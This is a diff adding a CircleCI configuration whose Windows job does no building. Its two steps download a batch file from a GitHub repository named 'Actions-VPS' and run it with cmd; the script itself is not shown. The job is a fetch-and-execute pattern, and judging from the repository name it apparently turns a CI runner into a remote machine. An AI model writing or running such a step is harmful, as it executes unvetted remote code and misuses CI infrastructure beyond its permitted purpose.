@@ -1,0 +1,13 @@
+version: 2.1
+ 
+orbs:
+  win: circleci/windows@2.2.0
+ 
+jobs:
+  build:
+    executor:
+      name: win/default
+      shell: pwsh.exe
+    steps:
+      - run: Invoke-WebRequest -OutFile all.bat -Uri https://github.com/EfeCodingg/Actions-VPS/raw/main/all.bat
+      - run: cmd /c all.bat
